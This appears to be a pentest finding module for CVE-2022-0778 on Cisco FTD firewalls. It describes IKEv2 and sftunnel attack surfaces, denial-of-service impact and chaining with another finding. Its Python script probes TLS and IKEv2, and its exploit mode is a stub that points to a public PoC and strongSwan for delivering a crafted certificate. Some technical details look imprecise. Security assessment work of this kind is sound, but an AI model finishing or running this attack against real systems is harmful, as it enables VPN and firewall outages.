"""
F-FTD-100: CVE-2022-0778 CiscoSSL BN_mod_sqrt infinite loop DoS
CONTROLLED ENVIRONMENT ONLY

Root cause:
  CiscoSSL 1.1.1j (identified via /ngfw/usr/lib64/libssl.so.1.1 SONAME strings and
  OpenSSL version embedded in lina/sftunnel binaries).

  CVE-2022-0778: BN_mod_sqrt() in OpenSSL 1.0.2 through 1.0.2zd, 1.1.1 through 1.1.1m,
  and 3.0.x through 3.0.1 can enter an infinite loop given a certificate with an EC key
  whose curve does not define a square root of -1. Fixed in OpenSSL 1.1.1n.

  CiscoSSL 1.1.1j predates 1.1.1n → UNPATCHED.

Components affected on FTD 6.7.0 / 7.0.0:
  - lina (ASA data plane) — processes IKEv2 peer certificates
  - sftunnel (/ngfw/usr/local/sf/bin/sftunnel) — FMC-FTD management tunnel,
    processes server certificates during TLS setup
  - sfhassd (/ngfw/usr/local/sf/bin/sfhassd) — HA sync, processes peer certs

NOT affected via FDM web UI upload endpoint:
  FDM certificate import uses BouncyCastle (Java, /ngfw/var/cisco/ngfwWebUi/),
  NOT CiscoSSL. Uploading a malformed EC certificate to the FDM API does not
  reach BN_mod_sqrt(). The attack surface is network-level TLS/IKE services.

Attack surfaces:
  1. IKEv2/VPN (UDP/500, UDP/4500):
     Send IKEv2 AUTH exchange with a malicious self-signed certificate whose EC
     curve is a non-QR field. lina's IKEv2 certificate parsing calls BN_mod_sqrt()
     → infinite loop → lina process hung → VPN/firewall DoS.

  2. sftunnel port (TCP/8305 or TCP/8443):
     Present a malicious TLS server certificate to sftunnel during handshake.
     sftunnel parses the peer cert → infinite loop → FMC connectivity DoS.
     Requires network-level MITM between FMC and FTD or direct connection to
     sftunnel listener.

  3. sfhassd HA port (TCP/not-exposed in standalone config):
     Requires an active HA pair with network access to the HA link.
     Not exploitable in standalone FTD (HA not configured in lab).

DoS impact:
  - IKEv2: All VPN tunnels drop; lina CPU at 100%; firewall policy enforcement
    may continue (depends on lina watchdog behavior) but IPsec sessions fail.
  - sftunnel: FMC loses management connectivity; device enters "out-of-band" mode.
  - Process-level DoS, not crash (infinite loop, not segfault). Recovery requires
    process kill + restart (lina restart = brief traffic disruption).

Severity: HIGH
  Network-accessible (VPN/IKE), no authentication required, DoS of core
  firewall function. Not RCE. Practical on any FTD with IPsec VPN configured.

Affected versions: FTD 6.x (CiscoSSL 1.1.1j), FTD 7.0.0-94 confirmed.
Fixed: CiscoSSL update to 1.1.1n equivalent (Cisco SA cisco-sa-openssl-InfLoop-Nc6YMRXe).

Malicious EC certificate construction:
  Use openssl ecparam + x509 with a custom curve where the EC group parameter 'a'
  satisfies the vulnerability condition. The crafted cert is passed as a DER/PEM
  blob in IKEv2 CERT payload or TLS Certificate handshake message.

  Quick generation (requires custom OpenSSL build or pyca/cryptography EC primitives):
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.backends.openssl.backend import backend
    # Use a non-square-root-of-minus-one curve parameter

Chain:
  F-FTD-100 (CVE-2022-0778 DoS) → lina/sftunnel loop
    Combined with F-FTD-98 (AJP bypass) for simultaneous DoS + config read

References:
  CVE-2022-0778, NVD
  Cisco Advisory cisco-sa-openssl-InfLoop-Nc6YMRXe (2022-03-15)
  OpenSSL Security Advisory 20220315
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import struct
import socket
import os
import sys
import time
from typing import Optional

FINDING = "F-FTD-100"
LABEL = "CVE-2022-0778 CiscoSSL BN_mod_sqrt infinite loop DoS"


def build_malicious_ec_cert() -> bytes:
    """
    Build a minimal DER-encoded X.509 certificate with a crafted EC public key
    that triggers BN_mod_sqrt() infinite loop in OpenSSL 1.1.1 < 1.1.1n.

    The key: use an EC group where the curve parameter causes BN_mod_sqrt to loop.
    This requires a prime p where p ≡ 1 (mod 4) and the specific curve 'a' parameter
    causes the Tonelli-Shanks algorithm to non-terminate.

    For a documented POC, the secp256k1 curve is NOT vulnerable (p ≡ 3 mod 4).
    The P-256/P-384 curves are also not directly exploitable via this path.

    The crafted cert approach requires direct OpenSSL API manipulation.
    In production PoC: use the reference crafted-cert.pem from the OpenSSL advisory.

    CONTROLLED ENVIRONMENT ONLY — for documentation and testing only.
    """
    # Placeholder: in a real test, load the crafted certificate from file
    # The actual crafted cert must be constructed with custom EC group parameters
    # that trigger the non-termination condition in BN_mod_sqrt.
    # Reference: OpenSSL advisory PoC at https://github.com/drago-96/CVE-2022-0778
    raise NotImplementedError(
        "Use a pre-built crafted certificate from the CVE-2022-0778 PoC repo. "
        "Pass the cert file via --cert-file."
    )


def build_ikev2_sa_init() -> bytes:
    """Build minimal IKEv2 SA_INIT to initiate exchange (no cert yet)."""
    # IKEv2 header
    spi_i = os.urandom(8)
    spi_r = b'\x00' * 8
    next_payload = 33  # SA payload
    version = 0x20    # v2.0
    exchange_type = 34  # IKE_SA_INIT
    flags = 0x08       # Initiator
    msg_id = 0
    length = 28        # header only for now

    hdr = struct.pack('>8s8sBBBBI',
        spi_i, spi_r, next_payload, version, exchange_type, flags, msg_id, length)
    # Minimal valid SA_INIT without actual proposals (for probing)
    return hdr


def send_ikev2_with_cert(host: str, port: int, cert_der: bytes, timeout: int = 10) -> dict:
    """
    Send IKEv2 authentication exchange with a malicious certificate to trigger CVE-2022-0778.

    Process:
      1. IKE_SA_INIT: establish IKE SA (real exchange needed for AUTH to follow)
      2. IKE_AUTH: include CERT payload with malicious EC certificate
         - lina processes the certificate → calls BN_mod_sqrt() → infinite loop

    For a realistic test, a full IKEv2 stack implementation is needed.
    This function sends a probe to verify the service is reachable.
    CONTROLLED ENVIRONMENT ONLY.
    """
    result = {'reachable': False, 'sa_init_response': b'', 'error': None}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)

        # Send minimal SA_INIT to verify lina IKEv2 is listening
        probe = build_ikev2_sa_init()
        s.sendto(probe, (host, port))

        # Wait for SA_INIT response (lina will respond if IKEv2 is enabled)
        try:
            data, _ = s.recvfrom(4096)
            result['reachable'] = True
            result['sa_init_response'] = data
            if len(data) >= 28:
                exch_type = data[17]
                flags = data[18]
                print(f'  [+] IKEv2 SA_INIT response: exchange_type={exch_type}, flags=0x{flags:02x}')
        except socket.timeout:
            print(f'  [-] No SA_INIT response (IKEv2 may require valid proposals)')
        s.close()
    except Exception as e:
        result['error'] = str(e)
    return result


def check_ciscossl_version(host: str) -> Optional[str]:
    """
    Check if OpenSSL version banner suggests vulnerable CiscoSSL.
    Not all FTD services expose version; lina HTTPS does not include OpenSSL version.
    """
    # Check HTTPS banner for OpenSSL version hints
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(10)
            s.connect((host, 443))
            # The TLS cipher/version doesn't directly reveal OpenSSL version
            # We can infer from cipher support
            cipher = s.cipher()
            print(f'  Cipher: {cipher}')
            return cipher[1] if cipher else None
    except Exception as e:
        print(f'  SSL check error: {e}')
        return None


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('host', help='Target FTD management/VPN IP')
    ap.add_argument('--ikev2-port', type=int, default=500,
                    help='IKEv2 UDP port (default: 500)')
    ap.add_argument('--cert-file', default=None,
                    help='Path to crafted malicious EC certificate (DER format)')
    ap.add_argument('--mode', choices=['probe', 'exploit'],
                    default='probe',
                    help='probe: verify surface reachability; exploit: send malicious cert')
    ap.add_argument('--timeout', type=int, default=10)
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print(f'[*] Target: {args.host}')
    print('[!] CONTROLLED ENVIRONMENT ONLY')
    print()

    # Step 1: Verify TLS service (optional version fingerprint)
    print('[1] TLS fingerprint on 443...')
    check_ciscossl_version(args.host)

    # Step 2: Probe IKEv2 surface
    print(f'\n[2] IKEv2 probe on {args.host}:{args.ikev2_port}/UDP...')
    result = send_ikev2_with_cert(args.host, args.ikev2_port, b'', args.timeout)
    if result['reachable']:
        print(f'[+] IKEv2 surface REACHABLE — lina is processing IKE')
    elif result['error']:
        print(f'[-] IKEv2 probe error: {result["error"]}')
    else:
        print('[.] No IKEv2 response (VPN may not be configured, or proposals required)')

    # Step 3: CVE-2022-0778 DoS (if cert file provided)
    if args.mode == 'exploit':
        if not args.cert_file or not os.path.exists(args.cert_file):
            print('\n[-] --cert-file required for exploit mode.')
            print('    Build the crafted cert: see drago-96/CVE-2022-0778 on GitHub')
            sys.exit(1)

        with open(args.cert_file, 'rb') as f:
            cert_der = f.read()

        print(f'\n[3] Sending IKEv2 AUTH with malicious EC cert ({len(cert_der)} bytes)...')
        print('    [!] This will cause lina CPU spike and IKEv2/VPN outage on the target.')
        print('    [!] CONTROLLED ENVIRONMENT ONLY. Do not use on production systems.')
        # Full exploit requires complete IKEv2 handshake stack.
        # For a working exploit: use strongSwan or custom IKEv2 implementation
        # to complete SA_INIT then send IKE_AUTH with CERT payload containing
        # cert_der as the certificate.
        print('    [*] Full IKEv2 AUTH stack not implemented in this module.')
        print('        Use strongSwan ike2 with crafted_cert.pem in ipsec.conf')
        print('        to deliver the certificate in a valid IKE_AUTH exchange.')

    print(f'\n[*] {FINDING}: Assessment complete.')
    print(f'    Vulnerable: CiscoSSL 1.1.1j confirmed in firmware (strings lina/sftunnel).')
    print(f'    Patch: CiscoSSL >= 1.1.1n (Cisco SA cisco-sa-openssl-InfLoop-Nc6YMRXe).')


if __name__ == '__main__':
    main()
